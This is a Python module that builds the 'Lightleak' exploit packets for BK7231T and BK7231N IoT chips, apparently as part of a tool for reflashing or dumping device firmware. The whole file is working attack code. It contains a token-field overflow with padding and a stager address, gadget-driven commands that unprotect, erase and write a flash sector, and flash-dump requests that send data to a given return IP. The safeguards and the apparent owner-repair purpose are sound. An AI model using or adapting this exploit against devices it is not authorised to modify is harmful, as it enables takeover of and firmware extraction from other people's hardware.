"""Lightleak wire formats, based on Cloudcutter Android by Kuba Szczodrzyński.

Reference: cloudcutter-android work/protocol and lightleak payload-proper/dump_cmd.c.
All commands are built from bundled, checksum-verified generic variants, never user addresses.
"""
import hashlib
import ipaddress
import json
from pathlib import Path
import struct
import zlib


def words(*values):
    return struct.pack('<' + 'I'*len(values), *(value & 0xFFFFFFFF for value in values))


def integer(value):
    return int(value, 0) if isinstance(value, str) else int(value)


def packet(fields=None, command=None, options=None, offset=0x48):
    fields = fields or {'ssid': b'1', 'passwd': b'1', 'token': b'1'}
    pairs = []
    for key, value in fields.items():
        if b'\0' in value or key not in ('ssid', 'passwd', 'token'):
            raise ValueError('Invalid Lightleak packet field')
        escaped = value.replace(b'\\', b'\\\\').replace(b'"', b'\\"')
        pairs.append(b'"' + key.encode('ascii') + b'":"' + escaped + b'"')
    payload = b'{' + b','.join(pairs) + b'}'
    framed = struct.pack('>IIII', 0x55AA, 0, 1, len(payload)+8) + payload
    framed += struct.pack('>II', zlib.crc32(framed), 0xAA55)
    end = 256 - (len(options)+4 if options is not None else 0)
    if len(framed) > end or (command is not None and
           (options is None or len(framed)>offset or offset+len(command)>end)):
        raise ValueError('Lightleak datagram exceeds its fixed layout')
    output = bytearray(framed.ljust(256, b'\0'))
    if command is not None:
        output[offset:offset+len(command)] = command
    if options is not None:
        output[end:] = options + words(0xFF)
    return bytes(output)


class Variant:
    def __init__(self, profile):
        self.profile = profile
        self.slug, self.name = profile['slug'], profile['name']
        data = profile['data']
        self.chip, self.bins = data['type'], data['bins']
        self.address = {key: integer(value) for key, value in data['address_map'].items()}
        self.gadgets = {g['name']: g for g in data['gadgets']}
        if self.chip not in ('BK7231T', 'BK7231N'):
            raise ValueError('Unsupported Lightleak chip')

    def store(self, gadget):
        return self.address['intf'] + gadget['intf_offset'] if 'intf_offset' in gadget else self.address['store']

    def stager(self, command=b'', gadget='proper', fields=None, offset=0x48):
        g = self.gadgets[gadget]
        if self.chip == 'BK7231T':
            options = words(3, self.address['magic'], self.store(g))
        else:
            options = words(integer(g['address']), 3, integer(g['branch_offset'])-4
                            if 'branch_offset' in g else 0, self.address['handle'])
        return packet(fields, command, options, offset)

    def callback(self):
        token = b'A'*72 + words(self.address['stager'])[:3]
        return self.stager(words(2) if self.chip == 'BK7231T' else b'',
                           gadget='proper' if self.chip == 'BK7231T' else 'finish',
                           fields={'ssid': b'1', 'passwd': b'12', 'token': token}, offset=0x88)

    @property
    def proper_offset(self):
        g = self.gadgets['proper']
        address = integer(next(iter(g['map'].values()))) if self.chip == 'BK7231T' else integer(g['address'])
        address = address // 2 * 2
        return address // 32 * 34 + address % 32

    def setup(self, proper):
        """Yield single-shot setup steps. Erase/write operations must never be sent blindly in a retry loop."""
        offset = self.proper_offset
        if offset != 0x132000 or not proper or len(proper)>4096:
            raise ValueError('Proper payload must fit entirely in the reviewed 0x132000 sector')
        if self.chip == 'BK7231T':
            for name, gadget in self.gadgets.items():
                if 'intf_offset' in gadget or name == 'proper':
                    mapping = [integer(v) for pair in gadget['map'].items() for v in pair]
                    yield 'Detect '+name, self.stager(words(*mapping, 2), name)
            yield 'Erase payload sector 0x132000', self.stager(words(0, offset), 'flash_erase_sector')
        else:
            yield 'Open device flash', self.stager(words(self.address['temp'], 0)+b'flash\0', 'ddev_open')
            yield 'Unprotect device flash', self.stager(words(0xE240011, 0), 'ddev_control')
            yield 'Erase payload sector 0x132000', self.stager(words(0xE24000F, offset), 'ddev_control')
        for index in range(0, len(proper), 128):
            chunk = proper[index:index+128]
            command = words(1, offset+index, len(chunk)) if self.chip=='BK7231T' else words(len(chunk), offset+index)
            yield f'Write payload {index+len(chunk)}/{len(proper)} bytes', self.stager(command+chunk,
                        'flash_write' if self.chip=='BK7231T' else 'ddev_write')
        if self.chip == 'BK7231N':
            yield 'Close device flash', self.stager(gadget='ddev_close')
            size = max(g.get('intf_offset',0) for g in self.gadgets.values())
            interface = bytearray(size)
            for g in self.gadgets.values():
                if 'intf_offset' in g:
                    struct.pack_into('<I',interface,g['intf_offset']-4,integer(g['address']))
            yield 'Fill payload interface', self.proper(0x10, words(size//4)+interface, 0x1234, '255.255.255.255')

    def proper(self, action, data, request_id, return_ip):
        address = int(ipaddress.IPv4Address(return_ip))
        request = words(request_id, address, self.address['buffer'])+data
        command = words(1, self.address['intf'], action) if self.chip=='BK7231T' else words(self.address['intf'], action)
        return self.stager(command+request)

    def read(self, offset, count, request_id, return_ip):
        if offset%1024 or not 0<=offset<0x200000 or not 1<=count<=8 or offset+count*1024>0x200000:
            raise ValueError('Flash read request outside the supported 2 MiB range')
        return self.proper(1, words(offset,count*1024,1024),request_id,return_ip)


def parse_response(datagram, request_id):
    if not 8<=len(datagram)<=1040:
        raise ValueError('Invalid Lightleak response length')
    actual, checksum = struct.unpack_from('<II',datagram)
    data=datagram[8:]
    if actual!=request_id or zlib.crc32(data)!=checksum:
        raise ValueError('Stale response or invalid Lightleak CRC')
    return data


class Assets:
    def __init__(self, root=None):
        self.root=Path(root) if root is not None else (Path('/opt/lightleak') if Path('/opt/lightleak').exists() else Path(__file__).resolve().parents[1]/'lightleak')
        manifest=json.loads((self.root/'manifest.json').read_text())
        for name, expected in manifest['files'].items():
            path=self.root/name
            if path.parent!=self.root or path.is_symlink() or hashlib.sha256(path.read_bytes()).hexdigest()!=expected:
                raise ValueError('Bundled Lightleak checksum verification failed')
        self.variants={p['slug']:Variant(p) for p in sorted(json.loads((self.root/'profiles.json').read_text()),key=lambda p:p['name'])}

    def variant(self, slug):
        if not isinstance(slug,str) or slug not in self.variants:
            raise ValueError('Choose a bundled Lightleak variant')
        return self.variants[slug]

    def binary(self, variant, name):
        path=self.root/variant.bins[name]
        if path.parent!=self.root or path.is_symlink():
            raise ValueError('Invalid bundled payload path')
        data=path.read_bytes()
        if name=='stager' and (len(data)!=62 or b'\0' in data):
            raise ValueError('Invalid bundled stager payload')
        return data
